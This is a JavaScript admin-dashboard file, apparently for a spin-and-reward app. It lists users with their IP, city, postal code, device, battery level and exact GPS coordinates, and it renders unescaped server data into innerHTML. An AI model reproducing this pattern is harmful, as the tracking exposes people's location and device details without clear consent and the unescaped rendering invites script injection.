const API_BASE = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
    ? 'http://localhost:8000'
    : (window.API_BASE_URL || 'https://lscstherapeking.xyz');

let authToken = null;

async function apiFetch(path, options = {}) {
    const headers = { 'Content-Type': 'application/json', ...options.headers };
    if (authToken) headers['Authorization'] = `Bearer ${authToken}`;
    const resp = await fetch(`${API_BASE}${path}`, { ...options, headers });
    if (resp.status === 401) { logout(); throw new Error('Unauthorized'); }
    return resp.json();
}

async function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorEl = document.getElementById('loginError');
    try {
        const data = await apiFetch('/api/admin/login', {
            method: 'POST',
            body: JSON.stringify({ username, password }),
        });
        authToken = data.token;
        localStorage.setItem('sfe_token', authToken);
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'flex';
        loadUsers();
    } catch (e) {
        errorEl.textContent = 'Invalid credentials';
    }
}

function logout() {
    authToken = null;
    localStorage.removeItem('sfe_token');
    document.getElementById('loginScreen').style.display = 'flex';
    document.getElementById('dashboard').style.display = 'none';
}

function showSection(name) {
    document.querySelectorAll('.section').forEach(s => s.style.display = 'none');
    document.getElementById(`section-${name}`).style.display = 'block';
    document.querySelectorAll('.nav-item').forEach(n => {
        n.classList.toggle('active', n.dataset.section === name);
    });
    if (name === 'users') loadUsers();
    if (name === 'apps') loadApps();
    if (name === 'tasks') loadTasks();
    if (name === 'alert') loadAlertMessage();
    if (name === 'convos') loadConvos();
}

async function loadUsers() {
    try {
        const data = await apiFetch('/api/admin/users');
        const grid = document.getElementById('usersGrid');
        if (!data.users.length) {
            grid.innerHTML = '<p class="empty-text">No users yet.</p>';
            return;
        }
        grid.innerHTML = data.users.map(u => `
            <div class="user-card ${u.banned ? 'banned' : ''}">
                <div class="user-card-header">
                    <span class="user-id">${u.user_id}</span>
                    <span class="badge ${u.banned ? 'badge-banned' : 'badge-active'}">
                        ${u.banned ? 'BANNED' : 'ACTIVE'}
                    </span>
                </div>
                <div class="user-info">
                    <div class="info-item">
                        <span class="info-label">IP</span>
                        <span class="info-value">${u.ip || 'N/A'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Country</span>
                        <span class="info-value">${u.country || 'N/A'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">City</span>
                        <span class="info-value">${u.city || 'N/A'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Postal Code</span>
                        <span class="info-value">${u.postal_code || 'N/A'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Device</span>
                        <span class="info-value">${u.device_brand || ''} ${u.device_model || 'N/A'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Battery</span>
                        <span class="info-value">${u.battery_pct != null ? u.battery_pct + '%' : 'N/A'} ${u.charging ? '⚡' : ''}</span>
                    </div>
                    ${u.latitude ? `
                    <div class="info-item">
                        <span class="info-label">Coordinates</span>
                        <span class="info-value">${u.latitude.toFixed(4)}, ${u.longitude.toFixed(4)}</span>
                    </div>` : ''}
                    <div class="info-item">
                        <span class="info-label">Last Seen</span>
                        <span class="info-value">${new Date(u.last_seen).toLocaleString()}</span>
                    </div>
                </div>
                <div class="info-item">
                    <span class="info-label">Spins</span>
                    <span class="info-value" id="spins-${u.user_id}">${u.bonus_spins != null ? u.bonus_spins : 0}</span>
                </div>
                <div class="user-actions">
                    ${u.banned
                        ? `<button class="btn-unban" onclick="unbanUser('${u.user_id}')">Unban</button>`
                        : `<button class="btn-ban" onclick="banUser('${u.user_id}')">Ban</button>`
                    }
                    <button class="btn-give-spins" onclick="giveSpins('${u.user_id}')">Give Spins</button>
                </div>
            </div>
        `).join('');
    } catch (e) {
        console.error('Failed to load users', e);
    }
}

async function banUser(userId) {
    await apiFetch(`/api/admin/ban/${userId}`, { method: 'POST' });
    loadUsers();
}

async function unbanUser(userId) {
    await apiFetch(`/api/admin/unban/${userId}`, { method: 'POST' });
    loadUsers();
}

async function addApp() {
    const url = document.getElementById('appUrl').value.trim();
    const name = document.getElementById('appName').value.trim();
    if (!url) return;
    await apiFetch('/api/admin/apps', {
        method: 'POST',
        body: JSON.stringify({ url, name: name || null }),
    });
    document.getElementById('appUrl').value = '';
    document.getElementById('appName').value = '';
    loadApps();
}

async function loadApps() {
    try {
        const data = await apiFetch('/api/admin/apps');
        const list = document.getElementById('appsList');
        if (!data.apps.length) {
            list.innerHTML = '<p class="empty-text">No app links added yet.</p>';
            return;
        }
        list.innerHTML = data.apps.map(a => `
            <div class="list-item">
                <div class="list-item-info">
                    <div class="list-item-title">${a.name}</div>
                    <div class="list-item-meta">${a.url}</div>
                </div>
                <div class="list-item-actions">
                    <span class="${a.claimed ? 'claimed-badge' : 'available-badge'}">
                        ${a.claimed ? 'Claimed' : 'Available'}
                    </span>
                    <button class="btn-delete" onclick="deleteApp('${a.id}')">Delete</button>
                </div>
            </div>
        `).join('');
    } catch (e) {
        console.error('Failed to load apps', e);
    }
}

async function deleteApp(appId) {
    if (!confirm('Delete this app link permanently?')) return;
    await apiFetch(`/api/admin/apps/${appId}`, { method: 'DELETE' });
    loadApps();
}

async function addTask() {
    const title = document.getElementById('taskTitle').value.trim();
    const description = document.getElementById('taskDesc').value.trim();
    const rewardSpins = parseInt(document.getElementById('taskReward').value) || 1;
    const countdown = parseInt(document.getElementById('taskCountdown').value) || 0;
    if (!title) return;
    await apiFetch('/api/admin/tasks', {
        method: 'POST',
        body: JSON.stringify({
            title,
            description: description || null,
            reward_spins: rewardSpins,
            countdown_minutes: countdown > 0 ? countdown : null,
        }),
    });
    document.getElementById('taskTitle').value = '';
    document.getElementById('taskDesc').value = '';
    document.getElementById('taskReward').value = '';
    document.getElementById('taskCountdown').value = '';
    loadTasks();
}

function formatCountdown(expiresAt) {
    if (!expiresAt) return '';
    const now = new Date();
    const exp = new Date(expiresAt);
    const diff = exp - now;
    if (diff <= 0) return '<span class="timer-expired">EXPIRED</span>';
    const hrs = Math.floor(diff / 3600000);
    const mins = Math.floor((diff % 3600000) / 60000);
    const secs = Math.floor((diff % 60000) / 1000);
    return `<span class="timer-active">${hrs}h ${mins}m ${secs}s left</span>`;
}

async function loadTasks() {
    try {
        const data = await apiFetch('/api/admin/tasks');
        const usersData = await apiFetch('/api/admin/users');
        const list = document.getElementById('tasksList');
        if (!data.tasks.length) {
            list.innerHTML = '<p class="empty-text">No tasks added yet.</p>';
            return;
        }
        list.innerHTML = data.tasks.map(t => {
            const submissions = t.submissions || {};
            const submittedUsers = Object.entries(submissions);
            let userRows = '';
            if (submittedUsers.length > 0) {
                userRows = `<div class="task-submissions"><h4>User Submissions</h4>` +
                    submittedUsers.map(([uid, status]) => {
                        const user = usersData.users.find(u => u.user_id === uid);
                        const label = user ? `${user.ip} (${uid})` : uid;
                        let actions = '';
                        if (status === 'submitted') {
                            actions = `<button class="btn-approve" onclick="taskAction('${t.id}','${uid}','approve')">Approve</button>
                                       <button class="btn-deny" onclick="taskAction('${t.id}','${uid}','deny')">Deny</button>`;
                        }
                        return `<div class="submission-row">
                            <span class="submission-user">${label}</span>
                            <span class="submission-status status-${status}">${status.toUpperCase()}</span>
                            ${actions}
                        </div>`;
                    }).join('') + `</div>`;
            }
            return `
            <div class="list-item task-item">
                <div class="list-item-info">
                    <div class="list-item-title">${t.title}</div>
                    <div class="list-item-meta">
                        ${t.description || ''}
                        | Reward: ${t.reward_spins || 1} spin(s)
                        ${t.expires_at ? '| ' + formatCountdown(t.expires_at) : ''}
                    </div>
                </div>
                <div class="list-item-actions">
                    <button class="btn-delete" onclick="deleteTask('${t.id}')">Delete</button>
                </div>
                ${userRows}
            </div>`;
        }).join('');
    } catch (e) {
        console.error('Failed to load tasks', e);
    }
}

async function deleteTask(taskId) {
    if (!confirm('Delete this task for everyone permanently?')) return;
    await apiFetch(`/api/admin/tasks/${taskId}`, { method: 'DELETE' });
    loadTasks();
}

async function taskAction(taskId, userId, action) {
    await apiFetch(`/api/admin/tasks/${taskId}/user/${userId}`, {
        method: 'POST',
        body: JSON.stringify({ action }),
    });
    loadTasks();
}

async function giveSpins(userId) {
    const amount = prompt('How many spins to give?', '1');
    if (!amount || isNaN(amount) || parseInt(amount) < 1) return;
    await apiFetch(`/api/admin/give-spins/${userId}`, {
        method: 'POST',
        body: JSON.stringify({ spins: parseInt(amount) }),
    });
    loadUsers();
}

async function loadAlertMessage() {
    try {
        const data = await apiFetch('/api/admin/alert-message');
        document.getElementById('alertMessage').value = data.message || '';
    } catch (e) {
        console.error('Failed to load alert message', e);
    }
}

async function saveAlertMessage() {
    const message = document.getElementById('alertMessage').value;
    try {
        await apiFetch('/api/admin/alert-message', {
            method: 'POST',
            body: JSON.stringify({ message }),
        });
        const status = document.getElementById('alertStatus');
        status.textContent = 'Alert message saved!';
        status.style.color = '#66ff66';
        setTimeout(() => { status.textContent = ''; }, 3000);
    } catch (e) {
        const status = document.getElementById('alertStatus');
        status.textContent = 'Failed to save.';
        status.style.color = '#e94560';
    }
}

async function loadConvos() {
    try {
        const data = await apiFetch('/api/admin/conversations');
        const list = document.getElementById('convosList');
        if (!data.conversations.length) {
            list.innerHTML = '<p class="empty-text">No conversations yet.</p>';
            return;
        }
        list.innerHTML = data.conversations.map(c => `
            <div class="list-item">
                <div class="list-item-info">
                    <div class="list-item-title">${c.title || 'Conversation'}</div>
                    <div class="list-item-meta">${c.date || ''}</div>
                </div>
            </div>
        `).join('');
    } catch (e) {
        console.error('Failed to load convos', e);
    }
}

// Auto-login with saved token
window.addEventListener('DOMContentLoaded', () => {
    const saved = localStorage.getItem('sfe_token');
    if (saved) {
        authToken = saved;
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'flex';
        loadUsers();
    }
});

// Enter key support for login
document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && document.getElementById('loginScreen').style.display !== 'none') {
        login();
    }
});
